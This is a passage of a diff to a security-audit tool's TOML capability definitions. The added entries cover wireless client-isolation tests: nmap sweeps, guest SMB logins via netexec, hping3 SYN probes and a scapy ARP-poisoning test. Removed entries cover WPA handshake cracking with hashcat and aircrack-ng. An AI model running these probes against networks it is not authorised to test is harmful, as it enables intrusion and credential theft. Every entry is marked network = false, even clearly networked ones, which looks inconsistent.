-args = ['-Pn', '-p', '22,80,445', '{peer}']
+name = 'Client Port Sweep'
+args = ['-e', '{iface}', '-sn', '--top-ports', '100', '{cidr}']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Cross Client Smb Probe'
+args = ['smb', '{cidr}', '-u', 'guest', '-p', '']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Client Web Reach Test'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', 'http://{client_ip}/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Cross Port Reach Test'
+args = ['-zv', '{client_ip}', '445']
+output = 'lines'
+network = false
 [[capability.provider]]
 binary = 'hping3'
 [[capability.provider.operation]]
-name = 'SYN Probe'
-args = ['-S', '-p', '80', '-c', '3', '{peer}']
+name = 'Isolation Policy Probe'
+args = ['-S', '-p', '22', '-c', '3', '{client_ip}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'scapy'
+binary = 'python3'
 [[capability.provider.operation]]
-name = 'Raw Layer Two'
-args = ['-c', 'isolation_test.py']
+name = 'Scapy Arp Poison Test'
+args = ['scapy_arp_test.py', '--iface', '{iface}', '--target', '{client_ip}']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'Internal Dns Leak Test'
+args = ['@{client_ip}', '{domain}', '+short', '+time=2', '+tries=1']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Reachable Host Extract'
+args = ['-E', 'is alive', '/tmp/iso/fping.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Reachable Host Dedup'
+args = ['-u', '/tmp/iso/reachable.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Reachable Host Count'
+args = ['-l', '/tmp/iso/reachable.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Iso Artifact Verify'
+args = ['/tmp/iso/reachable.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Iso Evidence Hash'
+args = ['/tmp/iso/reachable.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ping'
+[[capability.provider.operation]]
+name = 'Gateway Reach Confirm'
+args = ['-c', '4', '{gw_ip}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Iso Report Build'
+args = ['iso_report.py', '--in', '/tmp/iso/', '--out', '/tmp/iso_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Smb Hit Review'
+args = ['/tmp/iso/smb_hits.txt']
+output = 'lines'
+network = false
 
 [[capability]]
 id = 'wireless.audit-reporting'
 phase = 'wireless'
 label = 'AUDIT REPORTING'
-summary = 'Report wireless findings with cryptographic proof'
-inputs = [
-  { key = 'hashes', type = 'file', required = false, default = '/tmp/pmkid.22000' },
-  { key = 'inventory', type = 'file', required = false, default = '/tmp/inventory.csv' },
-  { key = 'report', type = 'file', required = false, default = '/tmp/wireless_report.md' },
-]
-[[capability.provider]]
-binary = 'aircrack-ng'
-[[capability.provider.operation]]
-name = 'Strength Verify'
-args = ['{hashes}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hashcat'
-[[capability.provider.operation]]
-name = 'Potfile Show'
-args = ['-m', '22000', '--show', '{hashes}']
-output = 'lines'
-network = false
-[[capability.provider]]
-binary = 'airdecap-ng'
-[[capability.provider.operation]]
-name = 'Decrypt Proof'
-args = ['-e', '{inventory}', '-p', 'passphrase', 'capture.pcap']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'tshark'
-[[capability.provider.operation]]
-name = 'Cipher Summary'
-args = ['-r', 'capture.pcap', '-Y', 'wlan.rsn']
-output = 'lines'
-network = true
+summary = 'Consolidate wireless findings into final audit artifacts'
+inputs = [ { key = 'domain', type = 'domain', required = false, default = '' } ]
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
-name = 'Risk Matrix'
-args = ['wireless_report.py', '--inventory', '{inventory}', '--out', '{report}']
+name = 'Master Report Build'
+args = ['wireless_master.py', '--indir', '/tmp/', '--out', '/tmp/wireless_report.md']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Ap Inventory Merge'
+args = ['/tmp/ap_inventory.csv']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Handshake Log Merge'
+args = ['/tmp/hs_report.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Critical Finding Sweep'
+args = ['-riE', 'wep|opn|cracked|pixie|bypass', '/tmp/wireless_report.md']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Report Line Count'
+args = ['-l', '/tmp/wireless_report.md']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Report Artifact Verify'
+args = ['/tmp/wireless_report.md', '/tmp/wireless_master.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Report Hash Snapshot'
+args = ['/tmp/wireless_report.md']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Finding Dedup Sort'
+args = ['-u', '/tmp/findings.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Risk Score Compute'
+args = ['risk_score.py', '--in', '/tmp/findings.txt', '--out', '/tmp/risk.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Evidence Manifest Build'
+args = ['-lh', '/tmp/cap/', '/tmp/hs/', '/tmp/pmkid/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'diff'
+[[capability.provider.operation]]
+name = 'Baseline Findings Diff'
+args = ['/tmp/findings_prev.txt', '/tmp/findings.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Final Report Review'
+args = ['/tmp/wireless_report.md']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Executive Summary Build'
+args = ['exec_summary.py', '--in', '/tmp/wireless_master.json', '--out', '/tmp/wireless_exec.md']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Remediation Tag Sweep'
+args = ['-riE', 'wpa3|pmf|rotation|isolation', '/tmp/wireless_exec.md']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Finding Count Tally'
+args = ['-l', '/tmp/findings.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Exec Summary Verify'
+args = ['/tmp/wireless_exec.md']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Exec Summary Hash'
+args = ['/tmp/wireless_exec.md']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Final Json Export'
+args = ['final_export.py', '--out', '/tmp/wireless_final.json']
+output = 'json'
+network = false
